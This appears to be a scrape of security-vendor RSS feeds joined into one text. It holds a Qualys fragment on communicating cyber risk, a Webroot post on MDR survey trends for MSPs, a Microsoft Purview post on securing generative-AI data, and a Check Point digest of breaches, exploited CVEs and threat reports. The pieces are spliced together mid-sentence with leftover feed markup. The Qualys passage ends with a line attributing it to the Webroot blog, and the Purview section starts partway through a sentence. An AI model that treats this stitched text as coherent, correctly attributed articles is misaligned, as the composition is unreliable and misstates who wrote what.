&lt;p&gt;During Qualys&amp;#8217; recent &lt;em&gt;Strategic Advisory Board meetings&lt;/em&gt;, CISOs highlighted the necessity of communicating risk in business language, fostering trust among executive leadership, and allocating budget and resources based on critical business risk.&lt;/p&gt;



&lt;p&gt;The following were the most notable challenges:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Limited Asset Visibility&lt;/strong&gt;—According to&amp;nbsp; &lt;a href="https://www.csoonline.com/article/3648998/look-for-attack-surface-management-to-go-mainstream-in-2022.html"&gt;ESG research&lt;/a&gt;, organizations spend more than 80 hours each month attempting to track unknown assets. Even more concerning, nearly 70% of organizations have reported experiencing attacks on unknown assets. In 2025, all organizations are expected to innovate in the cloud and deploy large language models (LLMs), further complicating the visibility of their attack surface.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Siloed tools and teams&lt;/strong&gt; — Many enterprises struggle with siloed tools and teams, often leading to a fragmented understanding of cyber risk. According to the &lt;a href="https://panaseer.com/resources/reports/2022-security-leaders-peer-report#:~:text=Security%20teams%20from%20big%20enterprises,sharp%20rise%20in%20ransomware%20attacks."&gt;Panaseer&lt;/a&gt; Survey, organizations rely on an average of over 70 security tools, creating a complex landscape of risk signals. For CISOs, the challenge lies in consolidating these diverse risk signals into a cohesive view.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;No financial context&lt;/strong&gt;&lt;strong&gt; –&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;CISOs regularly report to the board, but there’s only one language that truly resonates in the boardroom: MONEY. Metrics like the top 10 dashboards or the &amp;#8220;number of patches deployed&amp;#8221; don’t provide the necessary insights for leadership sleep at night. They want to know the likelihood of an attack, how much that attack would cost, and how much it will cost to reduce the risk.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Nearly 18 months ago, Qualys announced the &lt;a href="https://www.qualys.com/enterprise-trurisk-platform/"&gt;Enterprise TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; Platform&lt;/a&gt; designed to &amp;#8220;De-risk your business.&amp;#8221; The platform provides you with a unified view of your entire cyber risk posture and scales for use cases across security disciplines to help everyone—from the analyst to the CISO— to efficiently aggregate and&amp;nbsp;measure&amp;nbsp;all Qualys &amp;amp; non-Qualys risk factors in a unified view,&amp;nbsp;communicate&amp;nbsp;cyber risk with context to your business, and go beyond patching to eliminate the risk that threatens business in any area of your attack surface.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/01/27/managed-detection-and-response-key-trends-msps-cant-afford-to-ignore/" rel="nofollow"&gt;Managed Detection and Response: Key trends MSPs can’t afford to ignore&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Cyber threats have never been more relentless, and businesses of all sizes are feeling the pressure. That’s where Managed Detection and Response (MDR) comes in—a lifeline for overburdened security teams navigating a threat landscape that’s growing more sophisticated by the day.&lt;/p&gt;



&lt;p&gt;At its core, MDR is about augmenting, complementing, and upskilling internal security operations. It’s not just about tools—it’s about the expert humans behind those tools. MDR providers bring battle-tested security practitioners and capabilities with:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Global visibility &lt;/strong&gt;into threats and threat actors.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Detection engineering expertise&lt;/strong&gt; to uncover what others might miss.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Strong threat hunting capabilities&lt;/strong&gt;, working 24/7 to stay ahead of adversaries.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Seamless integration&lt;/strong&gt; across diverse security tools and logging ingestion from all corners of the organization’s infrastructure.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;What started as an emerging offering has quickly grown into a cornerstone of modern cybersecurity strategy. Today, MDR is a thriving, competitive market. As &lt;a href="https://reprint.forrester.com/reports/the-managed-detection-and-response-services-landscape-q4-2024-eef57419/index.html" rel="noreferrer noopener" target="_blank"&gt;Forrester&lt;/a&gt; notes: “MDR continues its ascent as an established, growing service with expansion, innovation, and an abundance of competition.”&lt;/p&gt;



&lt;p&gt;But with maturity comes diversity of capabilities. For Managed Service Providers (MSPs), the challenge isn’t just keeping pace with the evolution of MDR—it’s about understanding what truly matters to their customers and delivering solutions that make an impact.&lt;/p&gt;



&lt;h2 class="wp-block-heading has-text-align-center"&gt;So, what exactly drives adoption, and which capabilities resonate most with MSPs in supporting their customers?&lt;/h2&gt;



&lt;p&gt;When it comes to endpoint detection and response (EDR) compatibility, MSPs are split almost evenly—52% of respondents rated native compatibility as moderately or very important, while 48% viewed it as less critical.&lt;/p&gt;



&lt;p&gt;This near-even divide underscores an important trend: for many MSPs, the ability to support a range of EDR products is becoming just as crucial as having native EDR integration. Since many MSPs support a variety of EDR products across their customer base, the ability of an MDR solution to seamlessly integrate with multiple tools is often prioritized over a &amp;#8216;one-size-fits-all&amp;#8217; approach.&lt;/p&gt;



&lt;p&gt;For MSPs, this flexibility means they can:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Tailor MDR services to fit the unique needs of each SMB client&lt;/li&gt;



&lt;li&gt;Avoid being locked into a single EDR vendor, maintaining freedom of choice&lt;/li&gt;



&lt;li&gt;Future-proof their offerings by ensuring compatibility with emerging EDR tools&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Ultimately, while native EDR compatibility is still a desirable feature, MSPs are clear: an MDR solution’s real value lies in its versatility across diverse environments.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Cloud-based SIEM—The backbone of MDR&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The survey revealed that 81% of respondents rated cloud-based SIEM (security information and event management) as important—whether slightly, moderately, or very—to be included in their MDR solution. This emphasizes the shift toward scalable, centralized solutions designed to enhance visibility and efficiency in managing threats across the full breadth of the MSP customer’s environment.&lt;/p&gt;



&lt;p&gt;This highlights how cloud-based SIEMs empower MSPs to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Scale with ease &lt;/strong&gt;as their SMB customers grow and threats evolve&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Stay connected &lt;/strong&gt;with anywhere-accessible platforms&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Streamline operations&lt;/strong&gt; by correlating andcentralizing threat management and response&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For MSPs, incorporating cloud-based SIEM into their MDR offerings is no longer just a nice-to-have—it’s a competitive differentiator.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;SOAR capabilities—Automation in MDR services takes center stage&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;In the world of Managed Detection and Response (MDR), &lt;strong&gt;security orchestration, automation, and response (SOAR)&lt;/strong&gt; capabilities are rapidly becoming game-changers. For MSPs, the most valuable benefit from SOAR is clear: &lt;strong&gt;automation&lt;/strong&gt;. When asked to identify the most valuable benefit from SOAR, the results revealed key insights:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;30%—Automation of common tasks&lt;/strong&gt;&lt;br /&gt;Automating routine tasks significantly via workflows reduces the time spent on manual processes, leading to faster, more efficient incident resolution and freeing up teams to focus on higher-value activities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;27%—Improved 24/7/365 protection&lt;/strong&gt;&lt;br /&gt;Enhanced after-hours response capabilities are critical for ensuring continuous protection, especially for SMBs that need around-the-clock vigilance.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;24%—Reduced alert fatigue&lt;/strong&gt;&lt;br /&gt;Prioritizing actionable alerts enables more accurate threat detection, helping MSPs build greater confidence in their systems and focus on the threats that truly matter.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This prioritization reflects a preference for efficiency and proactive threat management in MDR workflows. For MSPs, SOAR isn’t just a tool for automation—it’s a critical enabler of better resource management, helping them reduce the burden on their teams while offering enhanced, after-hours response to their customers.&lt;/p&gt;



&lt;p&gt;The survey highlights key priorities for MSPs in the MDR landscape: flexibility, scalability, and efficiency. These qualities are critical for MSPs to meet the diverse and evolving needs of their SMB customers. For both MSPs and their customers, this focus translates into enhanced access to advanced threat detection and response capabilities, even when resources are constrained.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Up next—Deep dives into MDR’s most Important capabilities&lt;/h2&gt;



&lt;p&gt;This blog kicks off a four-part series exploring key insights from our OpenText MDR survey. Over the next few weeks, we’ll take a deeper look at the essential capabilities MSPs need to stay ahead of the curve and provide maximum value to their customers.&lt;/p&gt;



&lt;p&gt;We’ll dive into:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;EDR compatibility: &lt;/strong&gt;Why it’s crucial for your MDR offering—and when flexibility wins.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Cloud-based SIEM:&lt;/strong&gt; Why it’s a must have for MSPs in an MDR offering.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;SOAR benefits: &lt;/strong&gt;How SOAR is elevating MDR services and improving efficiency.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Stay tuned for actionable insights that will help MSPs navigate the rapidly evolving world of MDR.&lt;/p&gt;

They are concerned about data oversharing, data leaks, compliance, and other potential risks. &lt;a href="https://www.microsoft.com/security/business/microsoft-purview"&gt;Microsoft Purview&lt;/a&gt; is Microsoft’s solution for securing and governing data in generative AI.&lt;/p&gt;



&lt;p&gt;I’m often asked how long it takes to deploy Microsoft Purview. The answer depends on the specifics of the organization and what they want to achieve. Microsoft Purview should enable a comprehensive data governance program but it can provide risk mitigation for generative AI in the short term while the program is underway.&lt;/p&gt;


&lt;div class="wp-block-msxcm-cta-block"&gt;

	&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Organizations need AI solutions to add value for their customers and to stay competitive. They can’t wait for years to secure and govern these systems.&lt;/p&gt;



&lt;p&gt;For the organizations deploying generative AI, “how long does it take to deploy Microsoft Purview?” isn’t the right question.&lt;/p&gt;



&lt;p&gt;The risk mitigation Microsoft Purview provides for AI can begin on day one. This includes Microsoft AI, like Microsoft 365 Copilot, AI that an organization builds in-house, and AI from third parties like Google Gemini or ChatGPT.&lt;/p&gt;



&lt;p&gt;This post will discuss ways we can secure and govern data used or generated by AI quickly, with minimal user impact, change management, and resources required.&lt;/p&gt;



&lt;p&gt;These Microsoft Purview solutions are:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Microsoft Purview Data Security Posture Management for AI&lt;/li&gt;



&lt;li&gt;Microsoft Purview Information Protection&lt;/li&gt;



&lt;li&gt;Microsoft Purview Data Loss Prevention&lt;/li&gt;



&lt;li&gt;Microsoft Purview Communications Compliance&lt;/li&gt;



&lt;li&gt;Microsoft Purview Insider Risk Management&lt;/li&gt;



&lt;li&gt;Microsoft Purview Data Lifecycle Management&lt;/li&gt;



&lt;li&gt;Microsoft Purview Audit and Microsoft Purview eDiscovery&lt;/li&gt;



&lt;li&gt;Microsoft Purview Compliance Manager&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Here are short term steps you can take while the comprehensive data governance program is underway.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-data-security-posture-management-for-ai"&gt;Microsoft Purview Data Security Posture Management for AI &lt;/h2&gt;



&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-us/purview/ai-microsoft-purview#data-security-posture-management-for-ai-provides-insights-policies-and-controls-for-ai-apps" rel="noreferrer noopener" target="_blank"&gt;Microsoft Purview Data Security Posture Management for AI&lt;/a&gt; (DSPM for AI) provides visibility into data security risks. It reports on:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;User’s interactions with AI.&lt;/li&gt;



&lt;li&gt;Sensitive information in the prompts users share with the AI.&lt;/li&gt;



&lt;li&gt;Whether the sensitive information users share is labeled and thus is protected by durable security policy controls.&lt;/li&gt;



&lt;li&gt;Whether and how user interactions may be violating company policy including codes of conduct and attempts at jailbreak, where users manipulate the system to circumvent protections.&lt;/li&gt;



&lt;li&gt;The risk level of users interacting with the system, such as inadvertent or malicious activities they may be involved in that put the organization at risk.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;DSPM for AI reports on this for each AI application and can drill down from the reports to the individual user activities. DSPM for AI collects and surfaces insights from the other Microsoft Purview solutions around generative AI risks in a single screen.&lt;/p&gt;



&lt;p&gt;Custom sensitive information types, sensitivity labels, and information protection rules are reasoned over by DSPM for AI, but if these are not available, more than 300 out-of-the-box sensitive information types are available from day one.  &lt;/p&gt;



&lt;p&gt;DSPM for AI will use these to report on risk for the organization without additional configuration. The organization’s administrators can configure policy to mitigate these risks directly from the DSPM for AI tool.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of Data Security Posture Management for AI overview page. It shows interactions with Microsoft 365 Copilot, Enterprise Generative AI  from other providers and AI developed in-house." class="wp-image-137197" height="1528" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/fig-1-DSPM-for-AI-Overview-scaled.jpg" width="2560" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;em&gt;Figure 1. DSPM for AI shows interactions with Microsoft 365 Copilot, enterprise generative AI from other providers, and AI developed in-house.&lt;/em&gt;&lt;/p&gt;



&lt;figure class="wp-block-image size-full is-resized"&gt;&lt;img alt="Screenshot of Data Security Posture Management (DSPM) for AI reports showing user interactions with sensitive data for Microsoft 365 Copilot and other generative AI.  Admins can configure policy to mitigate risks from the DSPM solution." class="wp-image-137199" height="1447" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/fig-2-DSPM-for-AI-reports-scaled.jpg" style="width: 722px; height: auto;" width="2560" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;em&gt;Figure 2. DSPM for AI Reports on generative AI user interactions with sensitive data.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;A big concern that organizations have in widely deploying generative AI is that it will return results that contain sensitive information that the user should not have access to. SharePoint sites have been created over the years, are unlabeled, and may be accessible to the entire organization through the AI. The “security by obscurity” that may have prevented the sensitive information from being inappropriately shared is now negated by the AI that reasons over and returns the data.&lt;/p&gt;



&lt;p&gt;Data assessments, part of DSPM for AI, and currently in preview, identifies potential oversharing risks and allows the administrator to apply a sensitivity label to the SharePoint sites, the sensitive data, or initiate an Microsoft Entra ID user access review to manage group memberships.&lt;/p&gt;



&lt;p&gt;The administrator can engage the business stakeholder who has knowledge of the risk posed by the data and invite them to mitigate the risk or apply the policy at scale from the Microsoft Purview administration portal.&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Screenshot of Oversharing Assessment report, a feature of Data Security Posture Management for AI.  Shows the location of sensitive data and allows admins to configure policies to mitigate oversharing risks." class="wp-image-137201 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/fig-3-Data-Oversharing-Assessment-1024x515.webp" /&gt;&lt;/figure&gt;

&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-information-protection"&gt;Microsoft Purview Information Protection&lt;/h2&gt;



&lt;p&gt;The document access controls of &lt;a href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-information-protection"&gt;Microsoft Purview Information Protection&lt;/a&gt;, including sensitivity labels, are enforced when the data is reasoned over by AI. The user is given visibility in context that they are working with sensitive information. This awareness empowers users to protect the organization. &lt;/p&gt;



&lt;p&gt;The sensitivity labels that enforce scoped encryption, watermarking, and other protections travel with the document as the user interacts with the AI. When the AI creates new content based on the document, the new content inherits the most restrictive label and policy.&lt;/p&gt;



&lt;p&gt;Microsoft Purview can automatically apply sensitivity labels to AI interactions based on the organization’s existing policy for email, desktop applications, and Microsoft Teams, or new policy can be deployed for the AI.&lt;/p&gt;



&lt;p&gt;These can be based on out-of-the-box sensitive information types for a quick start.&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-2 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-information-protection"&gt;Learn more about Microsoft Purview Information Protection&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-data-loss-prevention"&gt;Microsoft Purview Data Loss Prevention&lt;/h2&gt;



&lt;p&gt;The &lt;a href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-data-loss-prevention"&gt;Microsoft Purview Data Loss Prevention&lt;/a&gt; policies that the organization currently uses for email, desktop applications, and Teams can be extended to the AI or new policy for the AI can be created. Cut and paste of sensitive information or transfer of a labeled document into the AI can be prevented or only allowed with an auditable justification from the user.&lt;/p&gt;



&lt;p&gt;A rule can be configured to prevent all documents bearing a specific label from being reasoned over by the AI. Out-of-the-box sensitive information types can be used for a quick start.&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-3 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-data-loss-prevention"&gt;Learn more about Microsoft Purview Data Loss Prevention&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-communication-compliance"&gt;Microsoft Purview Communication Compliance&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/risk-management/microsoft-purview-communication-compliance"&gt;Microsoft Purview Communication Compliance&lt;/a&gt;&amp;nbsp;provides the ability to detect regulatory compliance (for example, SEC or FINRA) and business conduct violations such as sensitive or confidential information, harassing or threatening language, and sharing of adult content.&lt;/p&gt;



&lt;p&gt;Out-of-the-box policies can be used to monitor user prompts or AI-generated content. It provides policy enforcement in near real time and also audit logs and reporting.&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-4 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/risk-management/microsoft-purview-communication-compliance"&gt;Learn more about Microsoft Purview Communication Compliance&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-insider-risk-management"&gt;Microsoft Purview Insider Risk Management&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/risk-management/microsoft-purview-insider-risk-management"&gt;Microsoft Purview Insider Risk Management&lt;/a&gt; correlates signal to identify potential malicious or accidental behaviors from legitimate users. Pre-configured generative AI-specific risk detections and policy templates are now available in preview.&lt;/p&gt;



&lt;p&gt;As the Insider Risk Management solution algorithms determine a user to be engaging in risky behavior, the data loss prevention (DLP) policies for that user can be made stricter using a feature called Adaptive Protection. It can be configured with out-of-the-box policies. This continuous monitoring and policy modulation mitigates risk while reducing administrator workload.&lt;/p&gt;



&lt;p&gt;AI analytics can be activated from the Microsoft Purview portal to provide insights even before the Insider Risk Management solution is deployed to users. This quickly surfaces AI risks with minimal administrative workload.&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-5 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/risk-management/microsoft-purview-insider-risk-management"&gt;Learn more about Microsoft Purview Insider Risk Management&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-data-lifecycle-management"&gt;Microsoft Purview Data Lifecycle Management&lt;/h2&gt;



&lt;p&gt;Microsoft Purview can enforce AI &lt;a href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-data-lifecycle-management"&gt;Data Lifecycle Management&lt;/a&gt;, with retention of AI prompts, prompt returns, and the documents AI creates for a specified time period. This can be done globally for every interaction with an AI solution. It can be done with out-of-the-box or custom policies. This will keep these interactions available for future investigations, for regulatory compliance, or to tune policies and inform the governance program.&lt;/p&gt;



&lt;p&gt;A policy for deletion of AI interactions can be enforced so information is not over-retained.&lt;/p&gt;

&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-audit-and-microsoft-purview-ediscovery"&gt;Microsoft Purview Audit and Microsoft Purview eDiscovery&lt;/h2&gt;



&lt;p&gt;The organization will need to support internal investigations around the use of AI. &lt;a href="https://www.microsoft.com/security/business/risk-management/microsoft-purview-audit"&gt;Microsoft Purview Audit&lt;/a&gt; logs and retains these interactions. They also need to support their legal team should they have to produce AI interactions to support litigation.&lt;/p&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/risk-management/microsoft-purview-ediscovery"&gt;Microsoft Purview eDiscovery&lt;/a&gt; can put a user’s interactions with the AI as well as their other Microsoft 365 documents and communications on hold so that their availability to support investigations is maintained. It allows them to be searched based metadata, enhancing relevancy, annotated, and produced.&lt;/p&gt;

&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-purview-compliance-manager"&gt;Microsoft Purview Compliance Manager&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/risk-management/microsoft-purview-compliance-manager"&gt;Microsoft Purview Compliance Manager&lt;/a&gt; has pre-built assessments for AI regulations including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;EU Artificial Intelligence Act.&lt;/li&gt;



&lt;li&gt;ISO/IEC 23894:2023.&lt;/li&gt;



&lt;li&gt;ISO/IEC 42001:2023.&lt;/li&gt;



&lt;li&gt;NIST AI Risk Management Framework (RMF) 1.0.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;These assessments are available to benchmark compliance over time, report on control status, and maintain and produce evidence for both Microsoft and the organization’s activities that support the regulatory compliance program.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="microsoft-purview-is-an-ai-enabler"&gt;Microsoft Purview is an AI enabler&lt;/h2&gt;



&lt;p&gt;Without security, governance, and compliance bases being covered, the AI program puts the organization at risk. An AI program can be blocked before it deploys if the team can’t demonstrate how it is mitigating these risks.&lt;/p&gt;



&lt;p&gt;The actions suggested here can all be taken quickly, and with limited effort, to set up a generative AI deployment for success.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Stark Aerospace, a US-based manufacturer specializing in missile systems and UAVs, contractor of the US Military and the Department of Defense (DoD), has been &lt;a href="https://cybernews.com/security/stark-aerospace-inc-ransomware-attack-weapons-defense-contractor/"&gt;targeted&lt;/a&gt; by the INC ransomware group. The attackers claim to have exfiltrated 4TB of data, including design documentation, source codes, firmware for various UAVs, contracts with the DoD, supply chain information, and personal data of company instructors.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat &lt;/em&gt;&lt;em&gt;(&lt;/em&gt;&lt;em&gt;Ransomware.Wins.INC.A&lt;/em&gt;&lt;em&gt;)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TalkTalk, a UK telecommunications company, has &lt;a href="https://www.bleepingcomputer.com/news/security/talktalk-investigates-breach-after-data-for-sale-on-hacking-forum/"&gt;suffered&lt;/a&gt; a data breach that resulted in the exposure of customer information, including names, email addresses, IP addresses, and phone numbers. A threat actor named &amp;#8220;b0nd&amp;#8221; claimed on a hacking forum to have stolen data affecting approximately 18.8 million current and former customers.&lt;/li&gt;
&lt;li&gt;ICICI Bank, an Indian multinational bank, has allegedly been a victim of a cyber-attack &lt;a href="https://cybersecuritynews.com/icici-bank-data-breach/"&gt;claimed&lt;/a&gt; by the BASHE ransomware group (also known as APT73 or Eraleig). The group has claimed to breach the bank’s database, and set an initial ransom deadline of January 24, 2025, threatening to expose sensitive data. ICICI Bank has not confirmed the breach, and legitimacy of the claims is being questioned with the deadline pushed to January 31, with no files leaked.&lt;/li&gt;
&lt;li&gt;Singapore-based cryptocurrency platform Phemex has &lt;a href="https://therecord.media/69-million-stolen-cyberattack-crypto-platform-phemex"&gt;experienced&lt;/a&gt; a cyberattack resulting in the theft of over $69 million in digital assets, including ETH, Bitcoin, and Binance Coin. The company has paused certain operations and is manually reviewing withdrawal requests while working on a compensation plan for affected users.&lt;/li&gt;
&lt;li&gt;Conduent, a major American business services provider and government contractor, has &lt;a href="https://www.bleepingcomputer.com/news/security/conduent-confirms-cybersecurity-incident-behind-recent-outage/"&gt;confirmed&lt;/a&gt; that a recent service outage was due to a cybersecurity incident. The disruption affected clients across multiple US states, including the Wisconsin Department of Children and Families.&lt;/li&gt;
&lt;li&gt;Rostelecom, a major Russian telecommunications provider, is &lt;a href="https://tass.ru/ekonomika/22933081"&gt;investigating&lt;/a&gt; a suspected cyberattack on one of its contractors after the hacker group Silent Crow claimed to have leaked company&amp;#8217;s data. The leaked information reportedly includes thousands of customer emails and phone numbers. The contractor is responsible for maintaining Rostelecom’s corporate website and procurement portal, which were targeted in the attack. Initial findings suggest no leak of highly sensitive personal data.&lt;/li&gt;
&lt;li&gt;West Virginia&amp;#8217;s Harrison County school district has &lt;a href="https://www.harcoboe.net/article/1982412"&gt;disclosed&lt;/a&gt; that it had suffered a cyber-attack. According to the district, it had shut down its network upon discovering the attack. The district has not provided information on whether any data was exfiltrated.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CISA and FBI have &lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a"&gt;identified&lt;/a&gt; exploitation of four vulnerabilities in Ivanti Cloud Service Appliances (CSA): an administrative bypass vulnerability (CVE-2024-8963), an SQL injection vulnerability (CVE-2024-9379); and remote code execution vulnerabilities (CVE-2024-8190 and CVE-2024-9380). Threat actors leveraged two distinct exploit chains to gain initial access, execute remote code, exfiltrate credentials, and implant webshells on victim networks. Affected versions include Ivanti CSA 4.6 (end-of-life) and earlier 5.0.1 versions. The vulnerabilities were actively exploited as zero days and were added to CISA’s Known Exploited Vulnerabilities Catalog.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(Ivanti Cloud Services Appliance Path Traversal (CVE-2024-8963), Ivanti Cloud Services Appliance SQL Injection (CVE-2024-9379), &lt;/em&gt;&lt;em&gt;Ivanti Cloud Services Appliance Command Injection (CVE-2024-8190), &lt;/em&gt;&lt;em&gt;Ivanti Cloud Services Appliance Command Injection (CVE-2024-9380))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SonicWall has &lt;a href="https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-sma1000-rce-flaw-exploited-in-zero-day-attacks/"&gt;disclosed&lt;/a&gt; a critical deserialization vulnerability (CVE-2025-23006) in SMA1000 Appliance Management Console (AMC) and Central Management Console (CMC). The flaw allows remote unauthenticated attackers to execute arbitrary OS commands. It has reportedly been exploited as a zero-day in attacks, targeting firmware versions up to 12.4.3-02804.&lt;/li&gt;
&lt;li&gt;Oracle&amp;#8217;s January 2025 Critical Patch Update &lt;a href="https://blog.qualys.com/vulnerabilities-threat-research/2025/01/22/oracle-critical-patch-update-january-2025-security-update-review"&gt;addresses&lt;/a&gt; 520 vulnerabilities across various products. Among these, 55 vulnerabilities have a CVSS v3 score of 9.8 and 14 are exploitable remotely without authentication. Affected products include Oracle Database Server, Oracle Communications, and Oracle Fusion Middleware.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point has &lt;a href="https://blog.checkpoint.com/research/exploring-q4-2024-brand-phishing-trends-microsoft-remains-the-top-target-as-linkedin-makes-a-comeback/"&gt;released&lt;/a&gt; its Brand Phishing Report for Q4 2024, highlighting that Microsoft continues to be the most impersonated brand in phishing attacks, accounting for a significant percentage of attempts. Notably, LinkedIn has reentered the top ten list, indicating a resurgence in phishing campaigns targeting social media platforms. The technology sector remains the most imitated industry, followed by social networks and banking.&lt;/li&gt;
&lt;li&gt;FBI has &lt;a href="https://www.ic3.gov/PSA/2025/PSA250123"&gt;issued&lt;/a&gt; a warning about North Korean IT workers exploiting remote work opportunities to steal source code and extort employers. These state-sponsored individuals deceive companies by posing as independent contractors and using their access to extract information. The FBI identifies these actions as part of a larger effort to generate revenue for the North Korean government.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.sentinelone.com/blog/hellcat-and-morpheus-two-brands-one-payload-as-ransomware-affiliates-drop-identical-code/"&gt;identified&lt;/a&gt; ransomware affiliates Hellcat and Morpheus deploying identical malicious payloads despite operating under different branding. Both groups employ sophisticated techniques for data encryption and exfiltration, targeting organizations across multiple industries. The findings suggest a shared codebase or toolkit used by these affiliates.&lt;/li&gt;
&lt;/ul&gt;

&lt;/ul&gt;
